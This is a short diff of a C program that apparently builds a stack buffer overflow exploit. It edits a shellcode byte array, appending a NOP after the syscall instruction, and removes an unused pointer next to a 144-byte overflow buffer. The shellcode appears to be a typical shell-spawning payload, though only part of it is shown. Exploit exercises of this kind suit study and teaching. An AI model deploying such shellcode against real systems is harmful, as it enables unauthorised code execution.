@@ -8,10 +8,9 @@ char shellcode[] = "\x48\x31\xc0"          		 // xor    %rax,%rax
     "\x57"                                       // push   %rdi
     "\x52"                                       // push   %rdx
     "\x48\x89\xe6"                               // mov    %rsp,%rsi
-    "\x0f\x05";                                  // syscall
+    "\x0f\x05\x90";                                  // syscall
 
 char large_string[144];
-char *b_ptr;
 int i;
 
 int main(void) {
